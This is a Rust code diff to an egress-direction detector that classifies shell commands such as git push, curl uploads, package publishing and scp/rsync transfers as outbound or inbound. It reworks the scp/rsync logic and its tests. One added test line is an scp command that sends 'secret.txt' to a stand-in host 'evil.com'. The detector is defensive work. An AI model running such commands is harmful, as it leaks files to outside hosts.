@@ -211,7 +211,6 @@ fn extract_domain_from_url(url: &str) -> Option<String> {
 fn detect_direction(command: &str) -> EgressDirection {
     let lower = command.to_lowercase();
 
-    // ── Git operations ──────────────────────────────────────────
     if lower.contains("git push") || lower.contains("git remote add") {
         return EgressDirection::Outbound;
     }
@@ -222,12 +221,10 @@ fn detect_direction(command: &str) -> EgressDirection {
         return EgressDirection::Inbound;
     }
 
-    // ── GitHub CLI ──────────────────────────────────────────────
     if lower.contains("gh repo create") || lower.contains("gh repo fork") {
         return EgressDirection::Outbound;
     }
 
-    // ── HTTP uploads (curl/wget/httpie) ─────────────────────────
     static CURL_UPLOAD_RE: OnceLock<Regex> = OnceLock::new();
     let curl_upload_re = CURL_UPLOAD_RE.get_or_init(|| {
         Regex::new(r"(?i)\b(curl|wget|xh|httpie)\b.*(-X\s*(POST|PUT|PATCH)|--data|--data-raw|--data-binary|-d\s|-F\s|--form|--upload-file|-T\s)").unwrap()
@@ -236,7 +233,6 @@ fn detect_direction(command: &str) -> EgressDirection {
         return EgressDirection::Outbound;
     }
 
-    // ── Package publish ─────────────────────────────────────────
     if lower.contains("npm publish")
         || lower.contains("cargo publish")
         || lower.contains("pip upload")
@@ -246,7 +242,6 @@ fn detect_direction(command: &str) -> EgressDirection {
         return EgressDirection::Outbound;
     }
 
-    // ── Docker push ─────────────────────────────────────────────
     if lower.contains("docker push") {
         return EgressDirection::Outbound;
     }
@@ -254,22 +249,17 @@ fn detect_direction(command: &str) -> EgressDirection {
         return EgressDirection::Inbound;
     }
 
-    // ── File transfer (scp/rsync) ───────────────────────────────
-    // scp <local> <remote>: = outbound; scp <remote>: <local> = inbound
-    static SCP_DIRECTION_RE: OnceLock<Regex> = OnceLock::new();
-    let scp_dir_re = SCP_DIRECTION_RE.get_or_init(|| {
-        Regex::new(r"(?i)\b(scp|rsync)\b\s+(?:-\S+\s+)*(\S+)").unwrap()
-    });
-    if let Some(cap) = scp_dir_re.captures(command) {
-        let first_arg = &cap[2];
-        if first_arg.contains(':') {
-            return EgressDirection::Inbound; // remote source → local dest
-        } else {
-            return EgressDirection::Outbound; // local source → remote dest
+    if lower.contains("scp ") || lower.contains("rsync ") {
+        let args: Vec<&str> = command.split_whitespace().collect();
+        if let Some(last) = args.last() {
+            if last.contains(':') {
+                return EgressDirection::Outbound; // local → remote dest
+            } else {
+                return EgressDirection::Inbound; // remote src → local
+            }
         }
     }
 
-    // ── Default: curl/wget without upload flags is inbound ──────
     if lower.contains("curl ") || lower.contains("wget ") {
         return EgressDirection::Inbound;
     }
@@ -514,10 +504,12 @@ mod tests {
         assert_eq!(detect_direction("curl --data-binary @f.bin https://x.com"), EgressDirection::Outbound);
         assert_eq!(detect_direction("curl https://example.com/api"), EgressDirection::Inbound);
 
-        // scp/rsync — actual logic that could regress
+        // scp/rsync — last arg determines direction (dest is always last)
         assert_eq!(detect_direction("scp file.txt user@remote.com:/tmp/"), EgressDirection::Outbound);
         assert_eq!(detect_direction("scp user@remote.com:/tmp/file.txt ./"), EgressDirection::Inbound);
+        assert_eq!(detect_direction("scp -i keyfile user@remote.com:/tmp/file ."), EgressDirection::Inbound);
+        assert_eq!(detect_direction("scp -P 2222 -i ~/.ssh/id secret.txt user@evil.com:/tmp/"), EgressDirection::Outbound);
         assert_eq!(detect_direction("rsync -av ./dist/ deploy@prod.com:/www/"), EgressDirection::Outbound);
-        assert_eq!(detect_direction("rsync -av deploy@prod.com:/log/ ./"), EgressDirection::Inbound);
+        assert_eq!(detect_direction("rsync -e ssh deploy@prod.com:/log/ ./"), EgressDirection::Inbound);
     }
 }
